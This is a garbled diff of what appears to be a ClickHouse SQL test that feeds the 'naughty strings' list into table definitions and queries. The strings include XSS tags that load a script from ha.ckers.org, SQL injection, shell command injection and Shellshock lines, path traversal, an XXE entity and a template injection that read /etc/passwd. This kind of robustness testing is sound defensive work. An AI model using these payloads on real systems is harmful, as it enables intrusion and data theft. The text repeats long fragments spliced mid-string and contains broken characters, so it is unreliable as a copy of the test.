"file:///etc/passwd" >]><foo>&xxe;</foo>','$HOME','$ENV{\'HOME\'}','%d','%s%s%s%s%s','{0}','%*.*s','%@','%n','File:///','../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../etc/hosts','() { 0; }; touch /tmp/blns.shellshock1.fail;','() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }','<<< %s(un=\'%s\') = %u','+++ATH0','CON','PRN','AUX','CLOCK$','NUL','A:','ZZ:','COM1','LPT1','LPT2','LPT3','COM2','COM3','COM4','DCC SEND STARTKEYLOGGER 0 0 0','Scunthorpe General Hospital','Penistone Community Church','Lightwater Country Park','Jimmy Clitheroe','Horniman Museum','shitake mushrooms','RomansInSussex.co.uk','http://www.cum.qc.ca/','Craig Cockburn, Software Specialist','Linda Callahan','Dr. Herman I. Libshitz','magna دنو. إذ هنا؟ الستار وتنصيب كان. أهّل ايطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما , يذكر الحدود أي بعد, معاملة بولندا، الإطلاق عل إيو." String,
+  "בְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ" String,
+  "הָיְתָהtestالصفحات التّحول" String,
+  "﷽" String,
+  "ﷺ" String,
+  "مُنَاقَشَةُ سُبُلِ اِسْتِخْدَامِ اللُّغَةِ فِي النُّظُمِ الْقَائِمَةِ وَفِيم يَخُصَّ التَّطْبِيقَاتُ الْحاسُوبِيَّةُ، " String,
+  "᚛ᚄᚓᚐᚋᚒᚄ ᚑᚄᚂᚑᚏᚅ᚜‪‪‪" String,
+  "‪‪᚛                 ᚜‪" String,
+  "‪‪test‪" String,
+  "‫test‫" String,
+  " test " String,
+  "test⁠test‫" String,
+  "⁦test⁧" String,
+  "Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣" String,
+  "̡͓̞ͅI̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎ ̰t͔̦h̞̲e̢̤ ͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍̗͓̳̮g͍ ̨o͚̪͡f̘̣̬ ̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰" String,
+  "̗̺͖̹̯͓Ṯ̤͍̥͇͈h̲́e͏͓̼̗̙̼̣͔ ͇̜̱̠͓͍ͅN͕͠e̗̱z̘̝̜̺͙p̤̺̹͍̯͚e̠̻̠͜r̨̤͍̺̖͔̖̖d̠̟̭̬̝͟i̦͖̩͓͔̤a̠̗̬͉̙n͚͜ ̻̞̰͚ͅh̵͉i̳̞v̢͇ḙ͎͟-҉̭̩̼͔m̤̭̫i͕͇̝̦n̗͙ḍ̟ ̯̲͕͞ǫ̟̯̰̲͙̻̝f ̪̰̰̗̖̭̘͘c̦͍̲̞͍̩̙ḥ͚a̮͎̟̙͜ơ̩̹͎s̤.̝̝ ҉Z̡̖̜͖̰̣͉̜a͖̰͙̬͡l̲̫̳͍̩g̡̟̼̱͚̞̬ͅo̗͜.̟" String,
+  "̦H̬̤̗̤͝e͜ ̜̥̝̻͍̟́w̕h̖̯͓o̝͙̖͎̱̮ ҉̺̙̞̟͈W̷̼̭a̺̪͍į͈͕̭͙̯̜t̶̼̮s̘͙͖̕ ̠̫̠B̻͍͙͉̳ͅe̵h̵̬͇̫͙i̹͓̳̳̮͎̫̕n͟d̴̪̜̖ ̰͉̩͇͙̲͞ͅT͖̼͓̪͢h͏͓̮̻e̬̝̟ͅ ̤̹̝W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫.͕" String,
+  "Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮" String,
+  "˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop ʇǝ ǝɹoqɐl ʇn ʇunpᴉpᴉɔuᴉ ɹodɯǝʇ poɯsnᴉǝ op pǝs 'ʇᴉlǝ ƃuᴉɔsᴉdᴉpɐ ɹnʇǝʇɔǝsuoɔ 'ʇǝɯɐ ʇᴉs ɹolop ɯnsdᴉ ɯǝɹo˥" String,
+  "00˙Ɩ$-" String,
+  "Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ" String,
+  "𝐓𝐡𝐞 𝐪𝐮𝐢𝐜𝐤 𝐛𝐫𝐨𝐰𝐧 𝐟𝐨𝐱 𝐣𝐮𝐦𝐩𝐬 𝐨𝐯𝐞𝐫 𝐭𝐡𝐞 𝐥𝐚𝐳𝐲 𝐝𝐨𝐠" String,
+  "𝕿𝖍𝖊 𝖖𝖚𝖎𝖈𝖐 𝖇𝖗𝖔𝖜𝖓 𝖋𝖔𝖝 𝖏𝖚𝖒𝖕𝖘 𝖔𝖛𝖊𝖗 𝖙𝖍𝖊 𝖑𝖆𝖟𝖞 𝖉𝖔𝖌" String,
+  "𝑻𝒉𝒆 𝒒𝒖𝒊𝒄𝒌 𝒃𝒓𝒐�SS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" String,
+  "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>" String,
+  "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" String,
+  "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>" String,
+  "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >" String,
+  "<SCRIPT SRC=//ha.ckers.org/.j>" String,
+  "<IMG SRC=\"javascript:alert('XSS')\"" String,
+  "<iframe src=http://ha.ckers.org/scriptlet.html <" String,
+  "\\\";alert('XSS');//" String,
+  "<u oncopy=alert()> Copy me</u>" String,
+  "<i onwheel=alert(1)> Scroll over me </i>" String,/  "<plaintext>" String,
+  "http://a/%%30%30" String,
+  "</textarea><script>alert(123)</script>" String,
+  "1;DROP TABLE users" String,
+  "1'; DROP TABLE users-- 1" String,
+  "' OR 1=1 -- 1" String,
+  "' OR '1'='1" String,
+  "'; EXEC sp_MSForEachTable 'DROP TABLE ?'; --" String,
+  " " String,
+  "%" String,
+  "_" String,
+  "--" String,
+  "--version" String,
+  "--help" String,
+  "$USER" String,
+  "/dev/null; touch /tmp/blns.fail ; echo" String,
+  "`touch /tmp/blns.fail`" String,
+  "$(touch /tmp/blns.fail)" String,
+  "@{[system \"touch /tmp/blns.fail\"]}" String,
+  "eval(\"puts 'hello world'\")" String,
+  "System(\"ls -al /\")" String,
+  "`ls -al /`" String,
+  "Kernel.exec(\"ls -al /\")" String,
+  "Kernel.exit(1)" String,
+  "%x('ls -al /')" String,
+  "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>" String,
+  "$HOME" String,
+  "$ENV{'HOME'}" String,
+  "%d" String,
+  "%s%s%s%s%s" String,
+  "{0}" String,
+  "%*.*s" String,
+  "%@" String,
+  "%n" String,
+  "File:///" String,
+  "../../../../../../../../../../../etc/passwd%00" String,
+  "../../../../../../../../../../../etc/hosts" String,
+  "() { 0; }; touch /tmp/blns.shellshock1.fail;" String,
+  "() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }" String,
+  "<<< %s(un='%s') = %u" String,
+  "+++ATH0" String,
+  "CON" Strin`````````````````````````````````````````````````````````````````````````````````````````````````````````g,
+  "PRN" String,
+  "AUX" String,
+  "CLOCK$" String,
+  "NUL" String,
+  "A:" String,
+  "ZZ:" String,
+  "COM1" String,
+  "LPT1" String,
+  "LPT2" String,
+  "LPT3" String,
+  "COM2" String,
+  "COM3" String,
+  "COM4" String,
+  "DCC SEND STARTKEYLOGGER 0 0 0" String,
+  "Scunthorpe General Hospital" String,
+  "Penistone Community Church" String,
+  "Lightwater Country Park" String,
+  "Jimmy Clitheroe" String,
+  "Horniman Museum" String,
+  "shitake mushrooms" String,
+  "RomansInSussex.co.uk" String,
+  "http://www.cum.qc.ca/" String,
+  "Craig Cockburn, Software Specialist" String,
+  "Linda Callahan" String,
+  "Dr. Herman I. Libshitz" String,
+  "magna cum laude" String,
+  "Super Bowl XXX" String,
+  "medieval erection of parapets" String,
+  "evaluate" String,
+  "mocha" String,
+  "expression" String,
+  "Arsenal canal" String,
+  "classic" String,
+  "Tyson Gay" String,
+  "Dick Van Dyke" String,
+  "basement" String,
+  "If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you." String,
+  "Roses are \u001b[0;31mred\u001b[0m, violets are \u001b[0;34mblue. Hope you enjoy terminal hue" String,
+  "But now...\u001b[20Cfor my greatest trick...\u001b[8m" String,
+  "The quic\b\b\b\b\b\bk brown fo\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007x... [Beeeep]" String,
+  "Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗" String,
+  "🏳0🌈️" String,
+  "జ్ఞ‌ా" String,
+  "گچپژ" String,
+  "{% print 'x' * 64 * 1024**3 %}" String,
+  "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" String
+) ENGINE = MergeTree ORDER BY "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" SETTINGS min_bytes_for_wide_part = '100G';
+
+INSERT INTO test ("0") SELECT 'Hello, world!';
+SELECT count() FROM test;
+
+DETACH TABLE test;
+ATTACH TABLE test;
+
+SELECT count() FROM test;
+
+INSERT INTO test ("0") VALUES ('Hello, world!');
+SELECT count() FROM test;
+
+DROP TABLE IF EXISTS test_r1;
+DROP TABLE IF EXISTS test_r2;
+
+CREATE TABLE test_r1 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r1') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+INSERT INTO test_r1 SELECT * FROM test;
+CREATE TABLE test_r2 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r2') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+
+SYSTEM SYNC REPLICA test_r2;
+
+SELECT count() FROM test_r1;
+SELECT count() FROM test_r2;
+
+DROP TABLE test_r1;
+DROP TABLE test_r2;
+
+SELECT groupArray(name) FROM system.columns WHERE database = currentDatabase() AND table = 'test';
+
+DROP TABLE test;
+
+SELECT 'undefined','undef','null','NULL','(null)','nil','NIL','true','false','True','False','TRUE','FALSE','None','hasOwnProperty','then','\\','\\\\','0','1','1.00','$1.00','1/2','1E2','1E02','1E+02','-1','-1.00','-$1.00','-1/2','-1E2','-1E02','-1E+02','1/0','0/0','-2147483648/-1','-9223372036854775808/-1','-0','-0.0','+0','+0.0','0.00','0..0','.','0.0.0','0,00','0,,0',',','0,0,0','0.0/0','1.0/0.0','0.0/0.0','1,0/0,0','0,0/0,0','--1','-','-.','-,','999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999','NaN','Infinity','-Infinity','INF','1#INF','-1#IND','1#QNAN','1#SNAN','1#IND','0x0','0xffffffff','0xff����ffffffffff','0xabad1dea','123456789012345678901234567890123456789','1,000.00','1 000.00','1\'000.00','1,000,000.00','1 000 000.00','1\'000\'000.00','1.000,00','1 000,00','1\'000,00','1.000.000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\\u0001\\u0002\\u0003\\u0004\\u0005\\u0006\\u0007\b\\u000e\\u000f\\u0010\\u0011\\u0012\\u0013\\u0014\\u0015\\u0016\\u0017\\u0018\\u0019\\u001a\\u001b\\u001c\\u001d\\u001e\\u001f','','\t\\u000b\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°�ЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้�~��็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้� end up in your dream, but we hope it works. Please wake up, we miss you.','Roses are \\u001b[0;31mred\\u001b[0m, violets are \\u001b[0;34mblue. Hope you enjoy terminal hue','But now...\\u001b[20Cfor my greatest trick...\\u001b[8m','The quic\b\b\b\b\b\bk brown fo\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007x... [Beeeep]','Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗','🏳0🌈️','జ్ఞ‌ా','گچپژ','{% print \'x\' * 64 * 1024**3 %}','{{ "".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}' FORMAT PrettyCompactNoEscapes;
+
+SELECT JSONExtract(
+    '{"x": [\n  "", \n  "undefined", \n  "undef", \n  "null", \n  "NULL", \n  "(null)", \n  "nil", \n  "NIL", \n  "true", \n  "false", \n  "True", \n  "False", \n  "TRUE", \n  "FALSE", \n  "None", \n  "hasOwnProperty", \n  "then", \n  "\\\\", \n  "\\\\\\\\", \n  "0", \n  "1", \n  "1.00", \n  "$1.00", \n  "1mushrooms" String,
+  "RomansInSussex.co.uk" String,
+  "http://www.cum.qc.ca/" String,
+  "Craig Cockburn, Software Specialist" String,
+  "Linda Callahan" String,
+  "Dr. Herman I. Libshitz" String,
+  "magna cum laude" String,
+  "Super Bowl XXX" String,
+  "medieval erection of parapets" String,
+  "evaluate" String,
+  "mocha" String,
+  "expression" String,
+  "Arsenal canal" String,
+  "classic" String,
+  "Tyson Gay" String,
+  "Dick Van Dyke" String,
+  "basement" String,
+  "If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you." String,
+  "Roses are \u001b[0;31mred\u001b[0m, violets are \u001b[0;34mblue. Hope you enjoy terminal hue" String,
+  "But now...\u001b[20Cfor my greatest trick...\u001b[8m" String,
+  "The quic\b\b\b\b\b\bk brown fo\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007x... [Beeeep]" String,
+  "Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗" String,
+  "🏳0🌈️" String,
+  "జ్ఞ‌ా" String,
+  "گچپژ" String,
+  "{% print 'x' * 64 * 1024**3 %}" String,
+  "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" String
+) ENGINE = MergeTree ORDER BY "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" SETTINGS min_bytes_for_wide_part = '100G';
+
+INSERT INTO test ("0") SELECT 'Hello, world!';
+SELECT count() FROM test;
+
+DETACH TABLE test;
+ATTACH TABLE test;
+
+SELECT count() FROM test;
+
+INSERT INTO test ("0") VALUES ('Hello, world!');
+SELECT count() FROM test;
+
+DROP TABLE IF EXISTS test_r1;
+DROP TABLE IF EXISTS test_r2;
+
+CREATE TABLE test_r1 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r1') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+INSERT INTO test_r1 SELECT * FROM test;
+CREATE TABLE test_r2 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r2') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+
+SYSTEM SYNC REPLICA test_r2;
+
+SELECT count() FROM test_r1;
+SELECT count() FROM test_r2;
+
+DROP TABLE test_r1;
+DROP TABLE test_r2;
+
+SELECT groupArray(name) FROM system.columns WHERE database = currentDatabase() AND table = 'test';
+
+DROP TABLE test;
+
+SELECT 'undefined','undef','null','NULL','(null)','nil','NIL','true','false','True','False','TRUE','FALSE','None','hasOwnProperty','then','\\','\\\\','0','1','1.00','$1.00','1/2','1E2','1E02','1E+02','-1','-1.00','-$1.00','-1/2','-1E2','-1E02','-1E+02','1/0','0/0','-2147483648/-1','-9223372036854775808/-1','-0','-0.0','+0','+0.0','0.00','0..0','.','0.0.0','0,00','0,,0',',','0,0,0','0.0/0','1.0/0.0','0.0/0.0','1,0/0,0','0,0/0,0','--1','-','-.','-,','999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999','NaN','Infinity','-Infinity','INF','1#INF','-1#IND','1#QNAN','1#SNAN','1#IND','0x0','0xffffffff','0xff����ffffffffff','0xabad1dea','123456789012345678901234567890123456789','1,000.00','1 000.00','1\'000.00','1,000,000.00','1 000 000.00','1\'000\'000.00','1.000,00','1 000,00','1\'000,00','1.000.000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\\u0001\\u0002\\u0003\\u0004\\u0005\\u0006\\u0007\b\\u000e\\u000f\\u0010\\u0011\\u0012\\u0013\\u0014\\u0015\\u0016\\u0017\\u0018\\u0019\\u001a\\u001b\\u001c\\u001d\\u001e\\u001f','','\t\\u000b\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°�ЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้�~��็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้� end up in your dream, but we hope it works. Please w000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\b','','\t\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°·‚—±','⅛⅜⅝⅞','ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็๹�้้้้้้้้็็็็็้้้้้�~��็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้� end up in your dream, but we hope it works. Please w000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\b','','\t\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°·‚—±','⅛⅜⅝⅞','ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้�horpe General Hospital" String,
+  "Penistone Community Church" String,
+  "Lightwater Country Park" String,
+  "Jimmy Clitheroe" String,
+  "Horniman Museum" String,
+  "shitake mushrooms" String,
+  "RomansInSussex.co.uk" String,
+  "http://www.cum.qc.ca/" String,
+  "Craig Cockburn, Software Specialist" String,
+  "Linda Callahan" String,
+  "Dr. Herman I. Libshitz" String,
+  "magna cum laude" String,
+  "Super Bowl XXX" String,
+  "medieval erection of parapets" String,
+  "evaluate" String,
+  "mocha" String,
+  "expression" String,
+  "Arsenal canal" String,
+  "classic" String,
+  "Tyson Gay" String,
+  "Dick Van Dyke" String,
+  "basement" String,
+  "If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you." String,
+  "Roses are \u001b[0;31mred\u001b[0m, violets are \u001b[0;34mblue. Hope you enjoy terminal hue" String,
+  "But now...\u001b[20Cfor my greatest trick...\u001b[8m" String,
+  "The quic\b\b\b\b\b\bk brown fo\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007x... [Beeeep]" String,
+  "Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗" String,
+  "🏳0🌈️" String,
+  "జ్ఞ‌ా" String,
+  "گچپژ" String,
+  "{% print 'x' * 64 * 1024**3 %}" String,
+  "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" String
+) ENGINE = MergeTree ORDER BY "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" SETTINGS min_bytes_for_wide_part = '100G';
+
+INSERT INTO test ("0") SELECT 'Hello, world!';
+SELECT count() FROM test;
+
+DETACH TABLE test;
+ATTACH TABLE test;
+
+SELECT count() FROM test;
+
+INSERT INTO test ("0") VALUES ('Hello, world!');
+SELECT count() FROM test;
+
+DROP TABLE IF EXISTS test_r1;
+DROP TABLE IF EXISTS test_r2;
+
+CREATE TABLE test_r1 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r1') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+INSERT INTO test_r1 SELECT * FROM test;
+CREATE TABLE test_r2 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r2') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+
+SYSTEM SYNC REPLICA test_r2;
+
+SELECT count() FROM test_r1;
+SELECT count() FROM test_r2;
+
+DROP TABLE test_r1;
+DROP TABLE test_r2;
+
+SELECT groupArray(name) FROM system.columns WHERE database = currentDatabase() AND table = 'test';
+
+DROP TABLE test;
+
